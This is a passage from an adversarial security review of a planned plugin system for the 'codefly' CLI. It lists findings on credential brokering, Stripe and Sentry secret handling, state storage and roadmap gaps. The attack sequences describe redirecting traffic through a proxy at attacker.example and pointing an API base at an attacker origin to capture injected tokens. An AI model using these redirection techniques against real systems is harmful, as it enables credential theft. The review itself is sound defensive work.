- **Evidence:** Go's DefaultTransport sets 'Proxy: ProxyFromEnvironment' (GOROOT/src/net/http/transport.go:46-57), and ProxyFromEnvironment reads HTTP_PROXY/HTTPS_PROXY/NO_PROXY and lowercase forms, selecting by scheme, returning nil only for host 'localhost' (transport.go:491-506). The precedent client builds no Transport at all (toolbox-web/server.go:76-85) so it inherits DefaultTransport and its environment proxy. The host's environment is whatever the developer's shell or direnv provides, and the proposal never mentions proxies as a broker input. Self-hosted Sentry will require custom CA support, which is exactly what lets a TLS-terminating proxy read injected credentials.
- **Failure or attack sequence:** A workspace .envrc, corporate dotfile, or anyone able to influence the CLI's environment sets HTTPS_PROXY=http://attacker.example:8080. Every brokered vendor request transits that host: with plain TLS the proxy sees CONNECT metadata (destination, timing, sizes), already an information leak the origin allowlist claims to prevent; with an operator CA bundle configured for self-hosted origins, or an enterprise CA in the system trust store, the proxy decrypts and reads the injected management credential and the one-time webhook signing secret.
- **Impact:** The 'exact origin' guarantee holds only at the URL layer; the actual TCP peer is chosen by ambient environment state that neither the plan digest nor policy records, so credential and one-time-secret confidentiality can be lost with no provider misbehavior at all.
- **Required change:** The broker must construct an explicit http.Transport with Proxy nil by default. If an operator proxy is required it must be declared in the environment/binding configuration, included in the plan digest and receipts, and validated (scheme, host, CA) like any other origin. Surface proxy state in 'codefly provider doctor'. Never use http.DefaultTransport in the broker.
- **Acceptance test:** Broker test with HTTPS_PROXY/HTTP_PROXY/ALL_PROXY set in the host environment: the request connects directly to the pinned destination IP (assert via a custom dialer or a local listener that never receives a CONNECT), and a request naming an undeclared proxy is refused. Doctor test: a set HTTPS_PROXY appears as a diagnostic.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-037 — One-time secret capture / fail-open miss path

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (broker), verified in P2
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Matching capture by resource type, method, path, and content type with a JSON Pointer is a safe filter for secret-bearing responses.
- **Evidence:** Proposal capture steps 1-7 specify behavior only 'for a matching successful response'; nothing specifies what happens when a request matches a declared capture rule but the response fails content-type verification, JSON parsing, or pointer resolution. Hostile-API assumption is explicit in the proposal's threat model ('provider API responses may be malicious'; 'response shapes may change').
- **Failure or attack sequence:** Stripe-shaped hostile/drifting API answers POST /v1/webhook_endpoints with 200 and content type text/plain (or JSON with duplicate keys `{"secret":"x","secret":"whsec_real"}`, or the secret moved to another field). The capture rule does not match or the pointer resolves nothing; the broker, having captured nothing, forwards the raw body — containing the real signing secret — to the provider process. Same result if the vendor renames the field between provider releases.
- **Impact:** Any parse/content-type/shape variance silently downgrades the security boundary from 'provider never sees the secret' to 'provider sees the secret whenever the vendor deviates', which is exactly the drift the proposal says to expect.
- **Required change:** Specify fail-closed semantics: if a request matches a capture rule's method+path, a response that cannot be parsed and captured exactly as declared is blocked — provider receives a structured error, safe metadata is checkpointed, operation becomes UNCERTAIN if the request was mutating. Provider always receives canonical re-serialized JSON. Add fuzz conformance tests (duplicate keys, arrays, wrong content type, huge values, non-2xx bodies with secret-shaped fields).
- **Acceptance test:** Broker conformance suite feeds a matching-path response with (a) wrong content type, (b) unparseable JSON, (c) duplicate keys, (d) pointer-miss shape; in all cases assert the provider receives an error and zero response-body bytes, and a checkpoint records the miss.
- **Lane/reviewer:** Lanes 8, 9

#### ADV-038 — Credential lifecycle / provider process environment

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation; hard gate before P2 dogfood with real keys
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Provider agents receive 'no raw management/runtime/build credential bundle' and 'no direct secret-store access' by reusing the existing agent launch machinery.
- **Evidence:** core/agents/manager/loader.go:722 — every agent spawn sets `cmd.Env = os.Environ()`, inheriting the complete CLI environment (extraEnv only appends, loader.go:295,384). Today's supported workflow exports vendor secrets into that environment: module-saas-starter/scripts/setup/stripe.sh:22 reads STRIPE_WEBHOOK_SECRET from the environment and the script help documents --env-file/env usage. 1Password session and service-account tokens (OP_*) and HTTP(S)_PROXY also live in the user environment.
- **Failure or attack sequence:** Founder exports STRIPE_API_KEY (or has OP_SERVICE_ACCOUNT_TOKEN set for CI). CLI spawns provider-stripe through the existing loader. The provider binary reads its own environ and now holds the raw management key and/or a token granting full secret-store read — no broker, handle, or PDP decision involved. Inherited HTTPS_PROXY additionally lets a compromised provider route any permitted traffic through an attacker-chosen proxy.
- **Impact:** The entire credential-handle architecture is bypassable at spawn time; 'no direct secret-store access' is false for any user with op session/service tokens in their shell, which is the normal 1Password CLI state.
- **Required change:** Provider spawns must use an allowlist-scrubbed environment (explicit minimal KEY set; no inheritance). Production admission (manager.WithProductionAdmission composition) must fail if the scrubbed spawn path is not in force. Add a conformance check that a provider binary cannot see any OP_*, *_API_KEY, *_SECRET*, or proxy variables from the parent.
- **Acceptance test:** Spawn a conformance provider with STRIPE_API_KEY=canary and OP_SERVICE_ACCOUNT_TOKEN=canary exported in the parent; the provider dumps sorted environ over the protocol; assert neither canary appears.
- **Lane/reviewer:** Lanes 8, 9

#### ADV-039 — HTTP broker origin model vs Sentry regional/self-hosted origins

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (manifest/broker schema), P2 (credential handle), P3 (Sentry)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The proposal claims the HTTP broker enforces 'a provider-manifest-derived exact origin allowlist' (core/docs/provider-plugins.md:650) with manifest api-origins as a fixed package-time list (provider-plugins.md:707-708) and GetProviderInformation returning 'exact allowed API origins' (provider-plugins.md:1088), while simultaneously requiring Sentry to accept 'API base or regional origin' as a binding input (provider-plugins.md:1673) and calling self-hosted/regional API a 'required design case' (provider-plugins.md:1926).
- **Evidence:** core/docs/provider-plugins.md:650, 707-708, 1088, 1673, 1926, 2095; official Sentry docs confirm regional origins us.sentry.io and de.sentry.io (https://docs.sentry.io/api/) and self-hosted installs use arbitrary customer origins; the current script already accepts arbitrary --api-base including http://localhost (module-saas-starter/scripts/setup/sentry.sh:69-72, 150-152).
- **Failure or attack sequence:** A user binds provider-sentry to a self-hosted origin https://sentry.corp.example. The packaged provider.codefly.yaml cannot have enumerated that origin at release time, so either (a) the broker rejects every request and the provider is unusable for exactly the case the proposal names as required, or (b) the manifest ships a wildcard/any-origin declaration, destroying the exact-origin ceiling: an attacker with workspace-YAML write access then sets api-base to https://attacker.example, and the broker injects the Sentry setup token into requests to the attacker origin. The script's accepted http://localhost base shows a third variant: a binding-supplied loopback origin turns the credential-injecting broker into an SSRF channel against host-local services.
- **Impact:** Setup-credential exfiltration to an arbitrary origin, or complete inability to support the self-hosted/regional case the proposal declares mandatory. The manifest schema and credential-handle origin binding are frozen in P1/P2, so discovering this in P3 forces a breaking manifest/protocol change.
- **Required change:** In P1, extend the manifest origin schema beyond a fixed list: declare origin classes, e.g. `fixed: [https://sentry.io, https://us.sentry.io, https://de.sentry.io]` plus an explicit `binding-supplied: true` slot admitted only under host URL policy (HTTPS required outside local environments, deny loopback/RFC1918 in non-local, TLS verification, no userinfo), with the resolved origin bound into the plan digest (already at provider-plugins.md:1155), the credential handle, and the human approval prompt.
- **Acceptance test:** Conformance: a binding whose api-base is not admitted by manifest+host policy causes Observe/Apply denial before any credential handle is minted. Live/local: with an approved self-hosted origin, every broker request targets exactly that origin; a redirect or provider request descriptor naming any other origin is denied and receipted; in a production-profile environment an http:// or RFC1918 origin is rejected at Validate.
- **Lane/reviewer:** Lane 14

#### ADV-040 — Output classification authority — scenario 18 (DSN over-/under-classification)

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (contract schema and projection writer), P3 (Sentry), P4 (Resend)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The proposal claims classification safety because each provider output carries 'classification' and 'whether browser exposure is allowed' (core/docs/provider-plugins.md:919-921) and 'SECRET maps to secret=true' (provider-plugins.md:927), i.e. classification is provider-declared (ceiling: the provider's own packaged manifest, provider-plugins.md:1084,1095-1096). Nothing gives the host-owned generic contract (error-tracking@1, provider-plugins.md:800,1715) authority over per-key classification.
- **Evidence:** Internal contradiction in the reference design itself: the public DSN is projected browser-side in the public file (provider-plugins.md:951 NEXT_PUBLIC_SENTRY_DSN), also written into error-tracking.secret.env (provider-plugins.md:957) together with genuinely non-secret SENTRY_ORG/SENTRY_PROJECT slugs and a genuinely secret SENTRY_AUTH_TOKEN (:959-961), and separately 'redacted in generic output unless an explicit --show-sensitive policy' (provider-plugins.md:1523-1525). Official Sentry docs state 'DSNs are safe to keep public because they only allow submission of new events... they do not allow read access' (https://docs.sentry.io/concepts/key-terms/dsn-explainer/). The starter's public error-tracking.env is a Git-tracked file (module-saas-starter/configurations/local/error-tracking.env) and the frontend embeds NEXT_PUBLIC_* into the browser bundle (module/services/frontend/code/instrumentation-client.ts:15).
- **Failure or attack sequence:** Under-classification: a buggy or third-party provider declares a secret-bearing output key (e.g. SENTRY_AUTH_TOKEN, or a value drawn from the keys API's `dsn.secret`) as PUBLIC/browser-exposable in its own manifest; the host has no contract-side floor to reject it; the value is written to the Git-tracked public env file and compiled into the browser JS bundle — IsSensitiveKey redaction (provider-plugins.md:252,927-928) protects logs, not the projected file. Over-classification: the DSN is declared SECRET/browser-forbidden; the host maps it to secret=true, NEXT_PUBLIC_SENTRY_DSN never reaches the public projection, instrumentation-client.ts silently initializes without a DSN, and error tracking is silently absent in the browser with a green setup run.
- **Impact:** Credential leak into Git history and shipped browser bundles (under-classification), or silent loss of the product capability being configured (over-classification). Because contracts are shared across providers, a single mis-declaring provider poisons the contract for every consumer.
- **Required change:** Make the generic contract the classification authority: error-tracking@1 (and billing@1, email@1) must pin per-key classification, purpose, and browser-exposure; the host rejects any provider output whose declared classification is weaker than the contract's, and treats stronger-than-contract secrecy on a contract-declared public browser key as a diagnosable projection failure rather than silent omission. Fix the projection example so the backend DSN and org/project slugs live in the public file, and drop the --show-sensitive redaction of the public DSN (or justify it explicitly against Sentry's own docs).
- **Acceptance test:** Conformance: a provider emitting a contract-declared secret key with classification PUBLIC or browser-exposable=true is rejected before the projection writer runs, with a receipt recording the denial; a provider emitting the contract-declared browser DSN key as SECRET produces a hard diagnostic naming the missing browser key, not a silent green run. Starter dogfood: browser bundle contains the DSN and contains no value matching the auth-token or secret-DSN fingerprints.
- **Lane/reviewer:** Lane 14

#### ADV-041 — State addressing / workspace canonicalization

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 (state layout must be right before P2 dogfood accumulates state)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Provider state at ~/.codefly/providers/<canonical-workspace-path-sha256>/... 'using the execution runtime's workspace-isolation pattern' (provider-plugins.md:1244-1248) is a sufficient durable address for ownership state.
- **Evidence:** cli/pkg/executionruntime/runtime.go:62-78 (DefaultStateDir uses filepath.Abs + filepath.Clean + sha256; no filepath.EvalSymlinks anywhere in that package); core/resources/workspace.go:40-75 (Workspace struct has Name/Layout/Path but no stable UUID or machine-independent identity); provider-plugins.md:1248, 1291-1295. Contrast: symlink resolution is used elsewhere, e.g. cli/pkg/sourceworkspace/source.go:233, core/shared/path.go:89.
- **Failure or attack sequence:** A developer moves the workspace directory, renames a parent directory, or accesses it via a symlink (macOS /tmp vs /private/tmp is the canonical case). The path sha changes, Codefly silently opens a fresh empty state directory, Observe reports every previously owned remote resource (Stripe webhook endpoint with its secret reference) as an existing unmanaged object, auto-adoption by URL is forbidden (provider-plugins.md:1293-1294), and the plan proposes CREATE of a duplicate resource or BLOCKED conflicts. The old state directory with all ownership, secret references, and uncertain checkpoints is orphaned forever with no detection, warning, or migration path.
- **Impact:** Ownership and recovery evidence — the entire purpose of provider state — is lost by an ordinary filesystem operation. Users get duplicate remote resources, dead secret references, and un-destroyable owned resources (destroy requires exact ownership). Invariant 31 (second run produces no diff) silently fails.
- **Required change:** In P1: (a) canonicalize the workspace path with EvalSymlinks before hashing; (b) record the canonical path, workspace name, and environment inside the state root; (c) on open, if the recorded path differs from the current one, refuse with a diagnostic and provide an explicit state-relocation command; (d) longer-term, introduce a stable workspace identity (generated ID persisted in the workspace manifest) and key state by it.
- **Acceptance test:** Create a binding and apply; move the workspace directory (and separately, access it through a symlink); run `codefly provider plan`. The command must either resolve to the same state or fail closed with a relocation diagnostic; it must never silently produce an empty-state plan proposing CREATE of an already-owned resource.
- **Lane/reviewer:** Lane 10

#### ADV-042 — State backend scope vs cross-binding ownership uniqueness

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (changing per-binding files to a workspace store after P2 is a state migration for every dogfood user)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** 'One remote object cannot be bound to multiple local addresses in the same state backend' (provider-plugins.md:1294-1295) is an enforceable invariant.
- **Evidence:** provider-plugins.md:1248 places the state store per binding (~/.codefly/providers/<sha>/<environment>/<binding>/), so each binding has its own bbolt file and its own lock; provider-plugins.md:1294-1295 states the uniqueness invariant; provider-plugins.md:786-792 explicitly supports multiple bindings of the same vendor in one environment. bbolt transactions cannot span files (cli/pkg/executionjournal/journal.go:74-80 documents one DB owning one lock/transaction boundary).
- **Failure or attack sequence:** Environment has bindings billing-a and billing-b (or the same binding name in two environments) against one Stripe account. Both import webhook endpoint we_123 — each per-binding store accepts it because no store can see the other. Later `codefly provider destroy billing-a` legitimately deletes we_123 as an owned/adopted resource, breaking billing-b, whose next Observe shows the resource missing and whose plan proposes re-CREATE with a new signing secret — cascading churn with no policy violation detected anywhere.
- **Impact:** The design's own layout contradicts its own ownership invariant. Dual ownership defeats deletion protection (invariant 23) and drift semantics, exactly the class of confusion the proposal claims to eliminate.
- **Required change:** In P1, define the state backend scope as one transactional store per workspace (single bbolt file with environment/binding buckets, matching the journal's bucket pattern) so a cross-binding remote-identity index (provider, account, resource type, remote ID -> binding address) can be maintained transactionally; import and adoption CAS against that index. Alternatively, weaken the invariant to per-binding and add a mandatory cross-binding conflict check at plan time — but state the choice explicitly.
- **Acceptance test:** Import the same remote ID into two bindings of the same workspace: the second import must fail with a dual-ownership diagnostic naming the first binding. Destroy in one binding must never delete a resource another binding's state references.
- **Lane/reviewer:** Lane 10

#### ADV-043 — Lost-response recovery for one-time-secret resources

- **Severity:** HIGH  **Confidence:** MEDIUM  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (Apply checkpoint semantics and manifest declaration), P2 (Stripe qualification of idempotent replay)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** UNCERTAIN plus next-plan reconciliation (provider-plugins.md:1213-1222) adequately recovers a mutation whose response was lost.
- **Evidence:** provider-plugins.md:1213-1214 ('refuses an automatic retry that might duplicate an effect') and security control 17 (provider-plugins.md:1419 'never auto-retry ambiguous effects') vs provider-plugins.md:1224-1226 (idempotency keys 'reduce creation ambiguity') — no same-attempt idempotent-replay policy is defined anywhere. provider-plugins.md:1293-1294 forbids adoption by URL match; provider-plugins.md:414-416 defines host-generated prospective resource IDs in the plan; provider-plugins.md:1610 observes 'Codefly ownership metadata when supported' — but nothing requires stamping the prospective ID into vendor metadata at create time. Apply checkpoints are specified only 'immediately after each externally visible effect' (provider-plugins.md:1183); no pre-send intent checkpoint (action, idempotency key, prospective ID) is required. Confidence MEDIUM because Stripe idempotent-replay response semantics (whether the original response including the signing secret is re-delivered within the retention window) is a vendor claim not verified against current official docs in this lane.
- **Failure or attack sequence:** Broker sends POST /v1/webhook_endpoints; connection drops. As written: (a) if no pre-send checkpoint exists, after a crash the host cannot even prove a request was in flight or reconstruct the idempotency key; (b) the blanket no-auto-retry rule forbids the one recovery that is provably non-duplicating — resending with the same idempotency key inside the same attempt; (c) next Observe finds an endpoint at the planned URL but URL-match adoption is forbidden and no ownership stamp exists, so the operator must manually confirm and approve an IMPORT; (d) the signing secret was delivered only in the lost response, so the imported endpoint must then be REPLACEd (destructive plan, approval, new secret, webhook re-verification) to become usable. Every transient network blip on a secret-bearing create becomes a manual, destructive, multi-step recovery.
- **Impact:** Operational toil and destructive churn on the most common failure mode of remote APIs; contradicts the founder-UX goal and makes 'uncertain outcomes are recoverable' (definition of done) mostly false for the flagship Stripe resource.
- **Required change:** Define in the protocol/foundation: (1) a mandatory durable pre-send checkpoint containing action ID, idempotency key, and prospective resource ID; (2) an explicit carve-out that same-attempt resend with the identical idempotency key on a declared-idempotent action is not an 'ambiguous retry' and is permitted within a bounded window before declaring UNCERTAIN; (3) a manifest-declarable ownership-stamp field (e.g. vendor metadata/description) written at create so a lost-response resource is provably self-identifying at next Observe, enabling a safe, plan-approved adopt-with-identity instead of an unverifiable URL match.
- **Acceptance test:** Conformance: kill the broker between send and response on a create with an idempotency key; on recovery, the provider either completes via same-key replay with no duplicate resource, or produces a plan that adopts the stamped resource by proven identity; the signing secret is recovered or the plan explicitly requires REPLACE — never a bare unmanaged conflict for a resource Codefly itself created.
- **Lane/reviewer:** Lane 10

#### ADV-044 — Stripe live-guard / account-mode observation

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 (credential-handle caveat fields), P2 (Stripe provider)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Proposal (core/docs/provider-plugins.md:1594-1600, `stripe.account` observed resource) claims the provider observes 'sandbox/live mode' of the account, and the live-guard (provider-plugins.md:1448-1464) rests on 'The Stripe provider must observe account mode and return it in the plan.'
- **Evidence:** Stripe Account object has no livemode attribute — attribute list at https://docs.stripe.com/api/accounts/object contains id, object, charges_enabled, details_submitted, etc., but no mode field. Mode is documented only via key prefixes ('Test keys: sk_test_/rk_test_; Live keys: sk_live_/rk_live_', https://docs.stripe.com/keys) and via the livemode attribute on other objects such as webhook endpoints (https://docs.stripe.com/api/webhook_endpoints/object: 'If the object exists in live mode, the value is true'). Under the proposal's own credential-handle model (provider-plugins.md:465-491) the provider never sees the raw key, so it cannot inspect the prefix. Today's script does the prefix check host-side: module-saas-starter/scripts/setup/stripe.sh:135-136 (`^sk_test_` regex).
- **Failure or attack sequence:** A founder points a local binding at a live account (scenario 11). Observe calls GET /v1/account, receives a valid acct_ response with no mode field, the provider cannot classify the account, and the plan either omits account mode or reports it from an unspecified source. The 'local environments may use sandbox/test accounts only' policy caveat has nothing authoritative to bind against, and a live-account mutation proceeds or the guard silently degrades to nothing.
- **Impact:** The single most important Stripe safety property (never mutate a live account from local dogfood) has no specified enforcement mechanism; the design text promises an observation the vendor API does not provide at the point the design says it is observed.
- **Required change:** Assign live/test classification explicitly to the host: (a) at credential resolution, the host (which does see raw secret bytes) classifies the key prefix (sk_test_/rk_test_ vs sk_live_/rk_live_) and binds `account-mode` into the credential handle, plan digest, and scoped-authorization caveats; (b) the broker cross-checks the `livemode` field on every mutation response (webhook endpoint create/update responses carry it) and aborts to UNCERTAIN on mismatch; (c) remove or reword the `stripe.account` 'sandbox/live mode' observed field to state its provenance (host key classification + response livemode), not GET /v1/account.
- **Acceptance test:** Live acceptance: supply an sk_live_-shaped key to a local-dogfood binding; setup must deny before any remote request beyond read-only observation, the deny receipt must record account-mode=live provenance=host-key-classification; separately, replay a cassette where a mutation response returns livemode=true under a test-classified handle and assert the operation halts as UNCERTAIN.
- **Lane/reviewer:** Lane 13

#### ADV-045 — Stripe webhook api_version immutability / REPLACE semantics

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P2 (Stripe provider); plan example fix in P0 doc revision
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Proposal Stripe section (core/docs/provider-plugins.md:1612-1620) declares `stripe.webhook-endpoint` supports 'create, update, import, and explicit delete' and pins Stripe-Version; the human plan example (provider-plugins.md:1503-1521) shows a webhook update alongside 'STRIPE_API_VERSION: 2025-… → 2026-02-25.clover' with 'secret: unchanged'.
- **Evidence:** POST /v1/webhook_endpoints accepts api_version at creation ('Events sent to this endpoint will be generated with this Stripe Version instead of your account's default', https://docs.stripe.com/api/webhook_endpoints/create), but the update endpoint's parameters are url, enabled_events, description, disabled, metadata only — api_version is not updatable (https://docs.stripe.com/api/webhook_endpoints/update). Event payload version is 'set during your webhook's endpoint creation. Otherwise, they use your Stripe account's default API version' (https://docs.stripe.com/api/versioning). The secret is 'Only returned at creation' (https://docs.stripe.com/api/webhook_endpoints/object).
- **Failure or attack sequence:** The binding's spec `api-version` is bumped (e.g. 2026-02-25.clover → 2026-07-29.dahlia). Plan emits UPDATE with 'secret: unchanged'. Apply either (a) sends api_version in the update and Stripe rejects/ignores it, leaving events rendered at the old version while the projected STRIPE_API_VERSION claims the new one — silent payload-schema divergence between what the webhook receiver parses and what events actually contain; or (b) the provider must delete+create, producing a new whsec_ the plan never declared, breaking the plan-digest invariant that approval covers exact actions and secret effects.
- **Impact:** Plan determinism and the approval-binds-exact-effects invariant (brief invariants 9, 18, 22) are violated for the most routine Stripe maintenance operation (API version upgrade); webhook verification breaks or events are mis-parsed after an apparently successful apply.
- **Required change:** Model api_version as a create-only, replacement-forcing field: a version change on a managed endpoint yields a REPLACE action (create-before-delete or delete-before-create per the existing plan action vocabulary at provider-plugins.md:1120-1146) whose declared secret effect is 'new signing secret captured, old secret retired'; fix the human plan example to show REPLACE + secret rotation; add api_version to the Codefly-owned immutable field set in the Stripe field-ownership table.
- **Acceptance test:** Conformance + live acceptance: create a managed endpoint pinned to version A, change spec to version B, assert the plan contains exactly one REPLACE with a declared write-once secret effect (never UPDATE with secret:unchanged); after apply, assert delivered events render at version B and the projected STRIPE_WEBHOOK_SECRET fingerprint changed.
- **Lane/reviewer:** Lane 13

#### ADV-046 — testing-conformance

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 (foundation exit gate), indirectly P2
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Reuse table row 'agent conformance | codefly agent ci | build/package/standalone verification | required extension: provider protocol conformance mode and fixtures' — implying Tier-2 provider conformance is an incremental extension of existing CI machinery.
- **Evidence:** cli/cmd/agents/ci.go:427-428 rejects any kind other than codefly:service for conformance ('agent conformance currently requires kind codefly:service'); ci.go:422-425 makes even codefly:module require --skip-conformance; the existing conformance model is Builder.Create service generation plus the workspace CI gate (ci.go:554-579 runGeneratedServiceConformance, ci.go:662-694 runWorkspaceGate invoking 'ci run --all'), which has no meaning for a leaf-protocol provider agent with no service, no Builder, and no workspace runtime.
- **Failure or attack sequence:** P1 is scoped and staffed assuming a small 'provider mode' flag on agent ci; in reality the conformance stage — the P1 exit gate's proof mechanism for 'validate, observe, plan, apply, project, rerun no diff, import, disconnect, destroy' — must be a new harness (fixture remote, golden plans, broker replay, receipt sequence verification). Either P1 slips or P1 is 'accepted' with conformance quietly reduced to build/audit stages, leaving the protocol frozen for Stripe without any conformance evidence.
- **Impact:** P1 exit gate becomes unverifiable or the phase schedule is materially wrong; the Stripe freeze (which gates Sentry/Resend parallelism) inherits the slip.
- **Required change:** Reclassify: agent ci manifest/source/build/audit/drift stages and child-process isolation (ci.go:476-509 GOWORK=off pattern) are REUSE AS-IS; the provider conformance stage is NEW. Budget it as its own deliverable (recommended Issue 4) with an explicitly defined neutral conformance provider and remote fixture, and make the P1/foundation exit gate reference that deliverable.
- **Acceptance test:** codefly agent ci --dir <provider-conformance-agent> runs a provider-specific conformance stage (not the generated-service gate) that executes all 12 steps listed in the proposal's Tier 2, and fails when the provider binary attempts an undeclared plan action or an unapproved origin; the service-kind path remains unchanged.
- **Lane/reviewer:** Lanes 19, 20, 21, 22

#### ADV-047 — production-readiness

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P5 definition, but the gate list must be fixed at P0/P1 because production admission logic is a P1 CLI deliverable
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The Definition of done adequately separates readiness ('complete for local dogfood' / 'complete for production').
- **Evidence:** provider-plugins.md:2209-2240 defines exactly two gates; provider-plugins.md:1010-1015 separately permits 'read-only production providers may run' and 'production providers may project already existing secret references' before a production sink exists — creating a production-observe operating state with no mandatory feature list. Wiring status: WithPrincipal/WithScopedAuthSecret/WithPermissionsCallback/WithProductionAdmission exist in core (core/agents/manager/loader.go:485,546,589,603) but have zero call sites in cli/ (rg over cli/ -g '*.go'), so no gate item is currently production-wired.
- **Failure or attack sequence:** A team enables 'read-only production' Stripe/Sentry observation using local-dogfood-grade infrastructure: the local PDP-callback fallback path (permitted 'only for read-only local development', provider-plugins.md:459-462) is the exact loophole — an operator or CI job points a binding at a live account with a management credential while principal validation, scoped-auth v2, digest pinning, and fail-closed PDP are absent, because no gate says they are required for observe. A compromised or buggy provider then spends a live management credential with only manifest-ceiling protection.
- **Impact:** Live management credentials used under sub-production controls; unattributable production access; the brief's invariant 5 (every production operation bound to a validated principal) is violated without any gate formally being skipped.
- **Required change:** Add a third named gate, 'production observe ready', to the Definition of done with a mandatory feature list (see three-gate table in 'special'): validated non-expired principal with no fallback paths, production admission rejecting every local/test bypass independently, scoped-auth v2 only, pinned version + artifact digest verification, proven fail-closed PDP + revocation, read-only broker enforcement (no mutating method/path admissible, no armed capture), receipt retention. State explicitly that provider-plugins.md:1010-1015 allowances are conditional on Gate B.
- **Acceptance test:** With a binding whose observed account mode is live/production, 'codefly provider observe' hard-fails listing each missing Gate-B control (principal, scoped-auth v2, digest verification, fail-closed PDP) independently; the same command succeeds only when all are present, and the receipt records gate=production-observe.
- **Lane/reviewer:** Lanes 19, 20, 21, 22

#### ADV-048 — roadmap-decomposition

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 structure; P5 structure
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** 'Keep the implementation issue count small' — issue 1 'Provider foundation: kind, protocol, host lifecycle, security, state, output, CLI, doctor, and conformance' is one reviewable work package.
- **Evidence:** provider-plugins.md:2195-2198 (issue 1 scope) versus the P1 deliverable list at provider-plugins.md:2005-2050, which spans core proto/SDK/manifest, the full permission composition (first-ever CLI wiring of core/agents/manager/loader.go options — zero existing call sites), the HTTP broker + credential handles + declarative one-time secret capture (the proposal's own most security-critical surface, provider-plugins.md:296-300), bbolt state + locking + upgrades, projection writer + secret sinks, receipts, a 13-command CLI group, doctor integration, and the conformance + cassette test infrastructure.
- **Failure or attack sequence:** A single issue of this size cannot receive the focused security review the broker/capture path requires; review fatigue causes exactly the credential-handling and TOCTOU defects the design exists to prevent, or the issue stalls serializing all provider work behind its slowest component.
- **Impact:** Either the security boundary ships under-reviewed or P2-P4 start dates slip behind non-blocking foundation work (e.g., doctor sections gating broker review).
- **Required change:** Split foundation into three reviewable issues with a frozen contract between them: (1) kind/proto/manifest/digest-spec/routing; (2) HTTP broker + credential handles + one-time capture + cassette recorder/sanitizer, with its own security review; (3) coordinator/permission-composition/state/projection/CLI/doctor. Add (4) neutral conformance provider + agent ci provider mode as the P1 exit-gate deliverable. Split proposed issue 5 into Gate-C production infrastructure versus GA operability. Full map in 'special'.
- **Acceptance test:** Each replacement issue is independently mergeable with green CI and a self-contained review scope; the broker issue's review checklist covers every Lane-7 attack from the brief without referencing coordinator internals; no issue requires reviewing more than one trust boundary.
- **Lane/reviewer:** Lanes 19, 20, 21, 22

#### ADV-049 — roadmap-contracts

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P0 (owner decision), P1 (deliverable), gates P2-P4
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Bindings declare 'output-contract: codefly.dev/configuration/billing@1' and manifests declare 'projections: contract: codefly.dev/configuration/billing version: 1', implying a resolvable versioned contract exists for validation.
- **Evidence:** rg for 'output-contract|codefly.dev/configuration' across core/ and cli/ (excluding .md) returns nothing; the SaaS starter defines only informal env-file conventions (e.g. billing.env keys 'BILLING_PROVIDER=stripe', 'STRIPE_API_BASE=...' written by scripts/setup/stripe.sh:215-221; default contracts in module-saas-starter/setup_scripts_test.go:180-190; identity contract documented only as a Markdown table in LOCAL_DOGFOODING.md). No P0-P5 deliverable creates a contract schema registry or assigns its owning repository; P1 core says only 'reuse structured failures and configuration messages' (provider-plugins.md:2018).
- **Failure or attack sequence:** P2 begins with the Stripe provider mapping outputs to billing@1; simultaneously the starter's consumers expect the script-era key set (no STRIPE_API_VERSION); with no authoritative schema, the provider, host validator, and starter consumers each embed a divergent implicit contract, and P3/P4 repeat the divergence for error-tracking@1 and email@1. Version negotiation ('@1') is meaningless without a registry, and conformance 'verify output projection' (Tier 2 step 8) has nothing to verify against.
- **Impact:** Cross-repo integration failures discovered at dogfood time instead of review time; the contract that must freeze before P2-P4 parallelism never formally freezes.
